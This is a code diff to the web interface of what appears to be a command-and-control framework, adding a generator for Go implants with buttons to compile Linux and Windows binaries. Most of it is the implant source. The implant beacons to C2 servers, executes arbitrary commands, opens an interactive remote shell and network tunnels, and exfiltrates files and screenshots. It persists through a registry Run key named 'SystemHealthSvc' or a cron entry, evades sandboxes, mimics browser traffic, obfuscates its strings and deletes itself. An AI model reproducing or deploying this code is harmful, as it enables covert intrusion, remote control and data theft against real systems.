@@ -2180,8 +2180,9 @@ function renderGenerateView() {
           <p style="color:var(--text3);font-size:12px;margin-top:4px">${t('gen_subtitle')}</p>
         </div>
         <div style="display:flex;gap:0;border:1px solid var(--border);border-radius:6px;overflow:hidden">
-          <button id="lang-py-btn"  onclick="setBeaconLang('py')"   style="padding:6px 18px;font-size:12px;font-weight:600;background:var(--accent);color:#fff;border:none;cursor:pointer">Python</button>
+          <button id="lang-py-btn"   onclick="setBeaconLang('py')"   style="padding:6px 18px;font-size:12px;font-weight:600;background:var(--accent);color:#fff;border:none;cursor:pointer">Python</button>
           <button id="lang-java-btn" onclick="setBeaconLang('java')" style="padding:6px 18px;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text2);border:none;cursor:pointer">Java</button>
+          <button id="lang-go-btn"   onclick="setBeaconLang('go')"   style="padding:6px 18px;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text2);border:none;cursor:pointer">Go</button>
         </div>
       </div>
 
@@ -2255,6 +2256,15 @@ function renderGenerateView() {
             <div class="info-row"><span class="key">Output</span><span class="val">Fat JAR (JRE required)</span></div>
             <div class="info-row"><span class="key">Cross-compile</span><span class="val" style="color:var(--online)">${t('info_cross_yes')}</span></div>
           </div>
+          <div id="beacon-info-go" style="display:none">
+            <div class="info-row"><span class="key">Type</span><span class="val">Go 1.21+ beacon</span></div>
+            <div class="info-row"><span class="key">Protocol</span><span class="val">HTTPS polling</span></div>
+            <div class="info-row"><span class="key">Auth</span><span class="val">X-Agent-Secret header</span></div>
+            <div class="info-row"><span class="key">TLS</span><span class="val">Self-signed accepted</span></div>
+            <div class="info-row"><span class="key">Deps</span><span class="val">None (stdlib only)</span></div>
+            <div class="info-row"><span class="key">Output</span><span class="val">Native binary (no runtime)</span></div>
+            <div class="info-row"><span class="key">Cross-compile</span><span class="val" style="color:var(--online)">${t('info_cross_yes')}</span></div>
+          </div>
         </div>
       </div>
 
@@ -2301,6 +2311,12 @@ function renderGenerateView() {
             <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('java-src')">⬇ .java</button>
             <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('jar')">⬇ .jar</button>
             <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn-java">⎘ Copy</button>
+          </div>
+          <div style="display:flex;gap:8px;display:none" id="beacon-dl-buttons-go">
+            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-src')">⬇ .go</button>
+            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-linux')">⬇ Linux ELF</button>
+            <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-windows')">⬇ Windows EXE</button>
+            <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn-go">⎘ Copy</button>
           </div>
         </div>
         <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden">
@@ -2940,12 +2956,15 @@ let _beaconLang = 'py';
 
 function setBeaconLang(lang) {
   _beaconLang = lang;
-  document.getElementById('lang-py-btn').style.background   = lang === 'py'   ? 'var(--accent)' : 'var(--bg3)';
-  document.getElementById('lang-py-btn').style.color        = lang === 'py'   ? '#fff' : 'var(--text2)';
-  document.getElementById('lang-java-btn').style.background = lang === 'java' ? 'var(--accent)' : 'var(--bg3)';
-  document.getElementById('lang-java-btn').style.color      = lang === 'java' ? '#fff' : 'var(--text2)';
+  ['py','java','go'].forEach(l => {
+    const btn = document.getElementById('lang-'+l+'-btn');
+    if (!btn) return;
+    btn.style.background = lang === l ? 'var(--accent)' : 'var(--bg3)';
+    btn.style.color      = lang === l ? '#fff' : 'var(--text2)';
+  });
   document.getElementById('beacon-info-py').style.display   = lang === 'py'   ? '' : 'none';
   document.getElementById('beacon-info-java').style.display = lang === 'java' ? '' : 'none';
+  document.getElementById('beacon-info-go').style.display   = lang === 'go'   ? '' : 'none';
   document.getElementById('gen-output').style.display = 'none';
 }
 
@@ -2997,16 +3016,21 @@ async function generateBeacon() {
   }
 
   let code, filename;
+  document.getElementById('beacon-dl-buttons-py').style.display   = 'none';
+  document.getElementById('beacon-dl-buttons-java').style.display = 'none';
+  document.getElementById('beacon-dl-buttons-go').style.display   = 'none';
   if (_beaconLang === 'java') {
     code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays);
     filename = 'Beacon.java';
-    document.getElementById('beacon-dl-buttons-py').style.display   = 'none';
     document.getElementById('beacon-dl-buttons-java').style.display = 'flex';
+  } else if (_beaconLang === 'go') {
+    code = generateGoBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays);
+    filename = 'main.go';
+    document.getElementById('beacon-dl-buttons-go').style.display = 'flex';
   } else {
     code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays);
     filename = 'beacon.py';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'flex';
-    document.getElementById('beacon-dl-buttons-java').style.display = 'none';
   }
   document.getElementById('beacon-filename-label').innerHTML = `${t('save_as')} <code style="color:var(--accent)">${filename}</code>`;
   document.getElementById('beacon-tab-label').textContent = filename;
@@ -4275,6 +4299,519 @@ public class Beacon {
 `;
 }
 
+function generateGoBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0) {
+  if (!Array.isArray(urls)) urls = [urls];
+
+  function xorEnc(str, key) {
+    const enc = new TextEncoder();
+    const b = enc.encode(str), k = enc.encode(key);
+    return Array.from(b).map((c,i) => c ^ k[i%k.length]).map(c=>c.toString(16).padStart(2,'0')).join('');
+  }
+  const xk = encMode === 'server'
+    ? serverKey
+    : (encMode === 'aes'
+        ? Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b=>b.toString(16).padStart(2,'0')).join('')
+        : Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b=>String.fromCharCode(97+b%26)).join(''));
+  const enc = s => (encMode === 'aes' || encMode === 'server') ? _sEnc(s, xk) : xorEnc(s, xk);
+  const eUrls = encMode !== 'server' ? urls.map(u => enc(u)) : [];
+  const es    = encMode !== 'server' ? enc(secret) : '';
+  // xL: emit xDec("hex", _xk) so no plaintext secrets in binary
+  const xL = s => `xDec("${enc(s)}", _xk)`;
+
+  // ── Config block ────────────────────────────────────────────────────────
+  const configBlock = encMode === 'server'
+    ? `const _bid    = "${bid}"
+var   _c2URLs = []string{${urls.map(u=>`"${u}"`).join(', ')}}
+var   _secret = "${secret}"
+var   _xk     string`
+    : `const _xk    = "${xk}"
+var   _c2URLs = func() []string { h := []string{${eUrls.map(e=>`"${e}"`).join(', ')}}; r := make([]string,len(h)); for i,v := range h { r[i]=xDec(v,_xk) }; return r }()
+var   _secret = xDec("${es}", _xk)`;
+
+  // ── Fetch key (server mode only) ─────────────────────────────────────────
+  const fetchKeyBlock = encMode === 'server' ? `
+func _fetchKey() bool {
+	fp := func() string {
+		ifaces, _ := net.Interfaces()
+		for _, ifc := range ifaces {
+			if mac := ifc.HardwareAddr.String(); mac != "" {
+				h := sha256.Sum256([]byte(_hostname() + mac))
+				return hex.EncodeToString(h[:])
+			}
+		}
+		return "00"
+	}()
+	for _, url := range _c2URLs {
+		req, _ := http.NewRequest("POST", url+"/api/beacon/key", strings.NewReader(
+			fmt.Sprintf(` + '`{"bid":"%s","fp":"%s"}`' + `, _bid, fp)))
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("X-Agent-Secret", _secret)
+		resp, err := _hc.Do(req)
+		if err != nil { continue }
+		var r map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&r)
+		resp.Body.Close()
+		if k, ok := r["key"].(string); ok && k != "" { _xk = k; return true }
+	}
+	return false
+}` : '';
+
+  const fetchKeyCall = encMode === 'server' ? '\n\tif !_fetchKey() { os.Exit(0) }' : '';
+
+  // ── Encryption block ─────────────────────────────────────────────────────
+  const encryptBlock = ev.encrypt ? `
+func _encBody(data []byte) []byte {
+	nonce := make([]byte, 8)
+	crand.Read(nonce)
+	nh := hex.EncodeToString(nonce)
+	key := []byte(_secret + nh)
+	out := make([]byte, len(data))
+	for i, b := range data { out[i] = b ^ key[i%len(key)] }
+	enc, _ := json.Marshal(map[string]interface{}{"enc": 1, "nonce": nh, "data": hex.EncodeToString(out)})
+	return enc
+}
+func _decResp(data []byte) []byte {
+	var obj struct { Enc int \`json:"enc"\`; Nonce string \`json:"nonce"\`; Data string \`json:"data"\` }
+	if json.Unmarshal(data, &obj) != nil || obj.Enc != 1 { return data }
+	raw, err := hex.DecodeString(obj.Data)
+	if err != nil { return data }
+	key := []byte(_secret + obj.Nonce)
+	for i := range raw { raw[i] ^= key[i%len(key)] }
+	return raw
+}` : `
+func _encBody(data []byte) []byte { return data }
+func _decResp(data []byte) []byte { return data }`;
+
+  // ── Traffic camouflage ───────────────────────────────────────────────────
+  const uaBlock = ev.traffic ? `
+var _uaPool = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+}
+var _referers = []string{
+	"https://www.google.com/","https://www.bing.com/","https://outlook.office365.com/","https://teams.microsoft.com/",
+}` : '';
+  const setUAHeaders = ev.traffic
+    ? `req.Header.Set("User-Agent", _uaPool[mrand.Intn(len(_uaPool))])\n\t\treq.Header.Set("Referer", _referers[mrand.Intn(len(_referers))])\n\t\treq.Header.Set("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")`
+    : `req.Header.Set("User-Agent", "Go/1.21")`;
+
+  // ── Sandbox detection ────────────────────────────────────────────────────
+  const sandboxBlock = ev.sandbox ? `
+func _checkSandbox() {
+	if runtime.NumCPU() < 2 { os.Exit(0) }
+	u := strings.ToLower(_username())
+	h := strings.ToLower(_hostname())
+	bad := []string{"sandbox","malware","virus","analyst","cuckoo","honey","vmware","vbox","analysis"}
+	for _, b := range bad {
+		if strings.Contains(u, b) || strings.Contains(h, b) { os.Exit(0) }
+	}
+	t := time.Now()
+	time.Sleep(500 * time.Millisecond)
+	if time.Since(t) < 400*time.Millisecond { os.Exit(0) }
+}` : '';
+  const sandboxCall = ev.sandbox ? '\n\t_checkSandbox()' : '';
+
+  // ── Background execution ─────────────────────────────────────────────────
+  const bgBlock = ev.background ? `
+func _background() {
+	if os.Getenv("_XOLO_D") != "" { return }
+	exe, err := os.Executable()
+	if err != nil { return }
+	cmd := exec.Command(exe)
+	cmd.Env = append(os.Environ(), "_XOLO_D=1")
+	cmd.Stdin = nil; cmd.Stdout = nil; cmd.Stderr = nil
+	cmd.Start()
+	os.Exit(0)
+}` : '';
+  const bgCall = ev.background ? '\n\t_background()' : '';
+
+  // ── Kill date ────────────────────────────────────────────────────────────
+  const killDateBlock = killDate ? `
+func _checkKillDate() {
+	kill, _ := time.Parse("2006-01-02", "${killDate}")
+	if !kill.IsZero() && time.Now().After(kill) { os.Exit(0) }
+}` : '';
+  const killDateCall = killDate ? '\n\t_checkKillDate()' : '';
+  const killDateLoop = killDate ? `\n\t\tif kd, _ := time.Parse("2006-01-02", "${killDate}"); !kd.IsZero() && time.Now().After(kd) { _selfDestruct() }` : '';
+
+  // ── Persistence ──────────────────────────────────────────────────────────
+  const persistBlock = persist ? `
+func _persist() {
+	exe, _ := os.Executable()
+	if runtime.GOOS == "windows" {
+		exec.Command("reg", "add",
+			xDec("${enc('HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run')}", _xk),
+			"/v", xDec("${enc('SystemHealthSvc')}", _xk), "/t", "REG_SZ", "/d", exe, "/f").Run()
+	} else {
+		entry := xDec("${enc('@reboot ')}", _xk) + exe
+		out, _ := exec.Command("crontab", "-l").Output()
+		if !strings.Contains(string(out), entry) {
+			combined := strings.TrimRight(string(out), "\\n") + "\\n" + entry + "\\n"
+			cmd := exec.Command("/bin/sh", "-c", "echo "+strconv.Quote(combined)+" | crontab -")
+			cmd.Run()
+		}
+	}
+}` : '';
+  const persistCall = persist ? '\n\t_persist()' : '';
+
+  // ── AES decode ───────────────────────────────────────────────────────────
+  const xDecFunc = encMode === 'aes' || encMode === 'server'
+    ? `func xDec(h, key string) string {
+	b, _ := hex.DecodeString(h)
+	if len(b) < 8 { return "" }
+	iv := b[:8]; ct := b[8:]
+	dk := sha256.Sum256([]byte(key))
+	dk2 := sha256.Sum256(dk[:])
+	dk3 := sha256.Sum256(dk2[:])
+	dk = dk3
+	for pos, ctr := 0, 0; pos < len(ct); ctr++ {
+		inp := append(dk[:], iv...)
+		inp = append(inp, byte(ctr>>24), byte(ctr>>16), byte(ctr>>8), byte(ctr))
+		block := sha256.Sum256(inp)
+		for j := 0; j < 32 && pos < len(ct); j++ { ct[pos] ^= block[j]; pos++ }
+	}
+	return string(ct)
+}`
+    : `func xDec(h, key string) string {
+	b, _ := hex.DecodeString(h)
+	k := []byte(key)
+	for i := range b { b[i] ^= k[i%len(k)] }
+	return string(b)
+}`;
+
+  const sha256Import = (encMode === 'aes' || encMode === 'server') ? '\n\t"crypto/sha256"' : '';
+
+  return `package main
+
+import (
+\t"bytes"
+\tcrand "crypto/rand"${sha256Import}
+\t"crypto/tls"
+\t"encoding/base64"
+\t"encoding/hex"
+\t"encoding/json"
+\t"fmt"
+\t"io"
+\tmrand "math/rand"
+\t"net"
+\t"net/http"
+\t"os"
+\t"os/exec"
+\t"path/filepath"
+\t"runtime"
+\t"strconv"
+\t"strings"
+\t"sync"
+\t"time"
+)
+
+const (
+\t_SLEEP   = ${sleep}
+\t_JITTER  = ${jitter}
+\t_HB_DAYS = ${hbDays}
+)
+
+${configBlock}
+
+var (
+\t_urlIdx int
+\t_lastOk = time.Now()
+\t_mu     sync.Mutex
+\t_agentID string
+\t_cwd     string
+\t_sleep   = _SLEEP
+\t_tnl     = map[string]*_tnlCh{}
+\t_tnlMu   sync.Mutex
+\t_hc      = &http.Client{
+\t\tTimeout: 15 * time.Second,
+\t\tTransport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
+\t}
+)
+
+type _tnlCh struct { conn net.Conn; closed bool; mu sync.Mutex }
+
+${xDecFunc}
+${uaBlock}
+${encryptBlock}
+${sandboxBlock}
+${bgBlock}
+${killDateBlock}
+${persistBlock}
+${fetchKeyBlock}
+
+func _post(path string, payload interface{}) map[string]interface{} {
+\tdata, _ := json.Marshal(payload)
+\tbody := _encBody(data)
+\t_mu.Lock(); idx := _urlIdx; urls := make([]string, len(_c2URLs)); copy(urls, _c2URLs); _mu.Unlock()
+\tfor i := range urls {
+\t\turl := urls[(idx+i)%len(urls)] + path
+\t\treq, err := http.NewRequest("POST", url, bytes.NewReader(body))
+\t\tif err != nil { continue }
+\t\treq.Header.Set("Content-Type", "application/json")
+\t\treq.Header.Set("X-Agent-Secret", _secret)
+\t\t${setUAHeaders}
+\t\tresp, err := _hc.Do(req)
+\t\tif err != nil { continue }
+\t\trb, _ := io.ReadAll(resp.Body); resp.Body.Close()
+\t\trb = _decResp(rb)
+\t\t_mu.Lock(); _urlIdx = (idx+i)%len(urls); _lastOk = time.Now(); _mu.Unlock()
+\t\tvar result map[string]interface{}
+\t\tjson.Unmarshal(rb, &result)
+\t\treturn result
+\t}
+\treturn nil
+}
+
+func _getBytes(path string) []byte {
+\t_mu.Lock(); idx := _urlIdx; urls := make([]string, len(_c2URLs)); copy(urls, _c2URLs); _mu.Unlock()
+\tfor i := range urls {
+\t\turl := urls[(idx+i)%len(urls)] + path
+\t\treq, _ := http.NewRequest("GET", url, nil)
+\t\treq.Header.Set("X-Agent-Secret", _secret)
+\t\tresp, err := _hc.Do(req)
+\t\tif err != nil { continue }
+\t\tdata, _ := io.ReadAll(resp.Body); resp.Body.Close()
+\t\t_mu.Lock(); _urlIdx = (idx+i)%len(urls); _mu.Unlock()
+\t\treturn data
+\t}
+\treturn nil
+}
+
+func _hostname() string { h, _ := os.Hostname(); return h }
+func _username() string {
+\tif u := os.Getenv("USER"); u != "" { return u }
+\tif u := os.Getenv("USERNAME"); u != "" { return u }
+\treturn "unknown"
+}
+func _localIP() string {
+\tconn, err := net.Dial("udp", "8.8.8.8:80")
+\tif err != nil { return "127.0.0.1" }
+\tdefer conn.Close()
+\treturn conn.LocalAddr().(*net.UDPAddr).IP.String()
+}
+func _osInfo() string { return runtime.GOOS + " " + runtime.GOARCH }
+func _baseDir() string { exe, _ := os.Executable(); return filepath.Dir(exe) }
+
+func _getOrCreateID() string {
+\tf := filepath.Join(_baseDir(), ".hid")
+\tif data, err := os.ReadFile(f); err == nil {
+\t\tif id := strings.TrimSpace(string(data)); id != "" { return id }
+\t}
+\tb := make([]byte, 16); crand.Read(b)
+\tid := fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
+\tos.WriteFile(f, []byte(id), 0600)
+\treturn id
+}
+func _loadCWD() string {
+\tf := filepath.Join(_baseDir(), ".cwd")
+\tif data, err := os.ReadFile(f); err == nil {
+\t\tp := strings.TrimSpace(string(data))
+\t\tif fi, err := os.Stat(p); err == nil && fi.IsDir() { return p }
+\t}
+\tcwd, _ := os.Getwd(); return cwd
+}
+func _saveCWD(p string) { os.WriteFile(filepath.Join(_baseDir(), ".cwd"), []byte(p), 0600) }
+func _selfDestruct() {
+\tos.Remove(filepath.Join(_baseDir(), ".hid"))
+\tos.Remove(filepath.Join(_baseDir(), ".cwd"))
+\tif exe, err := os.Executable(); err == nil { go os.Remove(exe) }
+\tos.Exit(0)
+}
+
+func _checkin() map[string]interface{} {
+\tresp := _post("/api/beacon/checkin", map[string]interface{}{
+\t\t"agent_id": _agentID, "hostname": _hostname(), "ip_internal": _localIP(),
+\t\t"os_info": _osInfo(), "username": _username(), "pid": os.Getpid(),
+\t\t"sleep_interval": _sleep, "cwd": _cwd,
+\t})
+\tif resp != nil {
+\t\tif ns, ok := resp["new_secret"].(string); ok && ns != "" { _mu.Lock(); _secret = ns; _mu.Unlock() }
+\t}
+\treturn resp
+}
+
+func _tunnelTick() {
+\t_tnlMu.Lock()
+\titems := []map[string]interface{}{}
+\tfor cid, ch := range _tnl {
+\t\tch.mu.Lock()
+\t\tif ch.closed { items = append(items, map[string]interface{}{"channel_id": cid, "data": "", "closed": true}); ch.mu.Unlock(); continue }
+\t\tbuf := make([]byte, 4096)
+\t\tch.conn.SetDeadline(time.Now().Add(10 * time.Millisecond))
+\t\tn, err := ch.conn.Read(buf)
+\t\tch.mu.Unlock()
+\t\tif n > 0 { items = append(items, map[string]interface{}{"channel_id": cid, "data": base64.StdEncoding.EncodeToString(buf[:n]), "closed": false})
+\t\t} else if err != nil && !strings.Contains(err.Error(), "timeout") {
+\t\t\tch.mu.Lock(); ch.closed = true; ch.mu.Unlock()
+\t\t\titems = append(items, map[string]interface{}{"channel_id": cid, "data": "", "closed": true})
+\t\t}
+\t}
+\t_tnlMu.Unlock()
+\tresp := _post("/api/beacon/tunnel/tick", map[string]interface{}{"agent_id": _agentID, "items": items})
+\tif resp == nil { return }
+\trespItems, _ := resp["items"].([]interface{})
+\tfor _, raw := range respItems {
+\t\titem, ok := raw.(map[string]interface{}); if !ok { continue }
+\t\taction, _ := item["action"].(string); cid, _ := item["channel_id"].(string)
+\t\tswitch action {
+\t\tcase "open":
+\t\t\thost, _ := item["host"].(string); portF, _ := item["port"].(float64)
+\t\t\tconn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, int(portF)), 10*time.Second)
+\t\t\tif err != nil { _post("/api/beacon/tunnel/tick", map[string]interface{}{"agent_id": _agentID, "items": []map[string]interface{}{{"channel_id": cid, "data": "", "closed": true}}}); continue }
+\t\t\t_tnlMu.Lock(); _tnl[cid] = &_tnlCh{conn: conn}; _tnlMu.Unlock()
+\t\tcase "data":
+\t\t\t_tnlMu.Lock(); ch := _tnl[cid]; _tnlMu.Unlock()
+\t\t\tif ch != nil { if raw, err := base64.StdEncoding.DecodeString(fmt.Sprint(item["data"])); err == nil { ch.mu.Lock(); ch.conn.Write(raw); ch.mu.Unlock() } }
+\t\tcase "close":
+\t\t\t_tnlMu.Lock(); ch := _tnl[cid]; delete(_tnl, cid); _tnlMu.Unlock()
+\t\t\tif ch != nil { ch.conn.Close() }
+\t\t}
+\t}
+}
+
+func _runCmd(cmd, taskID string) string {
+\tcmd = strings.TrimSpace(cmd)
+\tisWin := runtime.GOOS == "windows"
+\tif strings.HasPrefix(cmd, "sleep ") {
+\t\tif n, err := strconv.Atoi(strings.TrimSpace(cmd[6:])); err == nil { _sleep = n; return fmt.Sprintf("Sleep set to %ds", n) }
+\t\treturn "Usage: sleep <seconds>"
+\t}
+\tif cmd == "kill_beacon" { _selfDestruct() }
+\tif cmd == "info" {
+\t\treturn fmt.Sprintf("ID:       %s\\nHostname: %s\\nUser:     %s\\nOS:       %s\\nIP:       %s\\nPID:      %d\\nCWD:      %s",
+\t\t\t_agentID, _hostname(), _username(), _osInfo(), _localIP(), os.Getpid(), _cwd)
+\t}
+\tif cmd == "ps" {
+\t\tvar c *exec.Cmd
+\t\tif isWin { c = exec.Command("tasklist", "/FO", "CSV", "/NH") } else { c = exec.Command("ps", "aux", "--no-headers") }
+\t\tout, err := c.Output()
+\t\tif err != nil { return "Error: " + err.Error() }
+\t\treturn strings.TrimSpace(string(out))
+\t}
+\tif strings.HasPrefix(cmd, "kill ") {
+\t\tpid := strings.TrimSpace(cmd[5:])
+\t\tvar c *exec.Cmd
+\t\tif isWin { c = exec.Command("taskkill", "/F", "/PID", pid) } else { c = exec.Command("kill", pid) }
+\t\tif err := c.Run(); err != nil { return "Error: " + err.Error() }
+\t\treturn "[+] Signal sent to PID " + pid
+\t}
+\tif strings.HasPrefix(cmd, "download ") {
+\t\tpath := strings.TrimSpace(cmd[9:])
+\t\tif !filepath.IsAbs(path) { path = filepath.Join(_cwd, path) }
+\t\tdata, err := os.ReadFile(path)
+\t\tif err != nil { return "Error: " + err.Error() }
+\t\treturn "__b64file__:" + filepath.Base(path) + ":" + base64.StdEncoding.EncodeToString(data)
+\t}
+\tif cmd == "screenshot" {
+\t\ttmp := filepath.Join(os.TempDir(), fmt.Sprintf("img_%d.png", time.Now().UnixMilli()))
+\t\tvar err error
+\t\tif isWin {
+\t\t\tpsCmd := "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); $b.Save('" + tmp + "')"
+\t\t\terr = exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCmd).Run()
+\t\t} else { err = exec.Command("scrot", tmp).Run() }
+\t\tif err != nil { return "Error: " + err.Error() }
+\t\tdata, err := os.ReadFile(tmp); os.Remove(tmp)
+\t\tif err != nil { return "Error: " + err.Error() }
+\t\treturn "__b64file__:img_" + strconv.FormatInt(time.Now().UnixMilli(), 10) + ".png:" + base64.StdEncoding.EncodeToString(data)
+\t}
+\tif strings.HasPrefix(cmd, "__upload__:") && taskID != "" {
+\t\tparts := strings.SplitN(cmd, ":", 3)
+\t\tif len(parts) < 3 { return "Error: malformed upload command" }
+\t\tfilename, dest := parts[1], parts[2]
+\t\tif strings.HasSuffix(dest, "/") || strings.HasSuffix(dest, "\\\\") { dest = filepath.Join(dest, filename) }
+\t\tdata := _getBytes("/api/beacon/fetch/" + _agentID + "/" + taskID)
+\t\tif data == nil { return "Error: could not fetch " + filename }
+\t\tif err := os.WriteFile(dest, data, 0644); err != nil { return "Error: " + err.Error() }
+\t\treturn fmt.Sprintf("[+] %s \\u2192 %s (%d bytes)", filename, dest, len(data))
+\t}
+\tif strings.HasPrefix(cmd, "__ls__:") {
+\t\tlsPath := strings.TrimSpace(cmd[7:])
+\t\tif lsPath == "" { lsPath = _cwd }
+\t\tif !filepath.IsAbs(lsPath) { lsPath = filepath.Join(_cwd, lsPath) }
+\t\tentries, err := os.ReadDir(lsPath)
+\t\tif err != nil { return "Error: " + err.Error() }
+\t\ttype e struct { Name string \`json:"name"\`; Type string \`json:"type"\`; Size int64 \`json:"size"\`; Modified int64 \`json:"modified"\` }
+\t\tvar res []e
+\t\tfor _, en := range entries {
+\t\t\tfi, _ := en.Info(); t := "file"; var sz, mt int64
+\t\t\tif en.IsDir() { t = "dir" } else if fi != nil { sz = fi.Size() }
+\t\t\tif fi != nil { mt = fi.ModTime().Unix() }
+\t\t\tres = append(res, e{en.Name(), t, sz, mt})
+\t\t}
+\t\tout, _ := json.Marshal(map[string]interface{}{"path": lsPath, "entries": res})
+\t\treturn string(out)
+\t}
+\tif strings.HasPrefix(cmd, "__pty__:") {
+\t\tsid := cmd[8:]
+\t\tgo func() {
+\t\t\tvar proc *exec.Cmd
+\t\t\tif isWin { proc = exec.Command("cmd.exe") } else { proc = exec.Command("/bin/bash", "-i") }
+\t\t\tstdin, _ := proc.StdinPipe()
+\t\t\trPipe, wPipe, _ := os.Pipe()
+\t\t\tproc.Stdout = wPipe; proc.Stderr = wPipe; proc.Dir = _cwd
+\t\t\tif proc.Start() != nil { return }
+\t\t\twPipe.Close()
+\t\t\tgo func() {
+\t\t\t\tbuf := make([]byte, 4096)
+\t\t\t\tfor { n, err := rPipe.Read(buf); if n > 0 { _post("/api/beacon/pty_tick", map[string]interface{}{"session_id": sid, "data": base64.StdEncoding.EncodeToString(buf[:n])}) }; if err != nil { break } }
+\t\t\t}()
+\t\t\tfor {
+\t\t\t\tresp := _post("/api/beacon/pty_tick", map[string]interface{}{"session_id": sid, "data": ""})
+\t\t\t\tif resp == nil { break }
+\t\t\t\tif active, _ := resp["active"].(bool); !active { break }
+\t\t\t\tif inp, ok := resp["input"].(string); ok && inp != "" {
+\t\t\t\t\tif raw, err := base64.StdEncoding.DecodeString(inp); err == nil { stdin.Write(raw) }
+\t\t\t\t}
+\t\t\t\ttime.Sleep(100 * time.Millisecond)
+\t\t\t}
+\t\t\tproc.Process.Kill()
+\t\t}()
+\t\treturn "__pty_started__"
+\t}
+\tif strings.HasPrefix(cmd, "shell ") { cmd = cmd[6:] }
+\tif cmd == "cd" || cmd == "cd ." { return _cwd }
+\tif strings.HasPrefix(cmd, "cd ") {
+\t\ttarget := filepath.Clean(strings.TrimSpace(cmd[3:]))
+\t\tif !filepath.IsAbs(target) { target = filepath.Join(_cwd, target) }
+\t\tif fi, err := os.Stat(target); err == nil && fi.IsDir() { _cwd = target; _saveCWD(_cwd); return "" }
+\t\treturn "cd: " + target + ": No such directory"
+\t}
+\tvar c *exec.Cmd
+\tif isWin { c = exec.Command("cmd.exe", "/c", cmd) } else { c = exec.Command("/bin/sh", "-c", cmd) }
+\tc.Dir = _cwd
+\tout, err := c.CombinedOutput()
+\tresult := strings.TrimRight(string(out), "\\n\\r")
+\tif err != nil && result == "" { return "Error: " + err.Error() }
+\tif result == "" { return "(no output)" }
+\treturn result
+}
+
+func main() {${fetchKeyCall}${sandboxCall}${bgCall}${killDateCall}${persistCall}
+\t_agentID = _getOrCreateID()
+\t_cwd = _loadCWD()
+\tlastTnl := time.Now()
+\tfor {${killDateLoop}
+\t\tif _HB_DAYS > 0 && time.Since(_lastOk) > time.Duration(_HB_DAYS)*24*time.Hour { _selfDestruct() }
+\t\tif resp := _checkin(); resp != nil {
+\t\t\ttaskID, _ := resp["task_id"].(string)
+\t\t\tcommand, _ := resp["command"].(string)
+\t\t\tif taskID != "" && command != "" {
+\t\t\t\tout := _runCmd(command, taskID)
+\t\t\t\tif out != "__pty_started__" {
+\t\t\t\t\t_post("/api/beacon/result", map[string]interface{}{"task_id": taskID, "output": out, "status": "done"})
+\t\t\t\t}
+\t\t\t}
+\t\t}
+\t\tif time.Since(lastTnl) >= time.Second { go _tunnelTick(); lastTnl = time.Now() }
+\t\tji := mrand.Float64() * float64(_sleep) * (float64(_JITTER) / 100.0)
+\t\ttime.Sleep(time.Duration(float64(_sleep)+ji) * time.Second)
+\t}
+}
+`;
+}
+
 function copyBeacon() {
   const code = document.getElementById('beacon-code').textContent;
   navigator.clipboard.writeText(code).then(() => {
@@ -4320,6 +4857,35 @@ async function downloadBeacon(type) {
   if (type === 'java-src') {
     const blob = new Blob([code], { type: 'text/plain' });
     const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'Beacon.java'; a.click();
+    return;
+  }
+
+  if (type === 'go-src') {
+    const blob = new Blob([code], { type: 'text/plain' });
+    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'main.go'; a.click();
+    return;
+  }
+
+  if (type === 'go-linux' || type === 'go-windows') {
+    statusEl.style.cssText = 'display:block;background:var(--bg3);color:var(--text2);padding:10px 14px;border-radius:6px;font-size:12px';
+    statusEl.textContent = `⏳ Compiling Go for ${type === 'go-windows' ? 'Windows' : 'Linux'}... (~15s)`;
+    const platform = type === 'go-windows' ? 'windows' : 'linux';
+    const res = await apiFetch('/api/info/beacon/compile-go', {
+      method: 'POST',
+      body: JSON.stringify({ code, platform }),
+    });
+    if (!res || !res.ok) {
+      const err = await res?.json().catch(() => ({ detail: 'Unknown error' }));
+      statusEl.style.color = 'var(--danger)';
+      statusEl.textContent = `✗ ${err.detail}`;
+      return;
+    }
+    const blob = await res.blob();
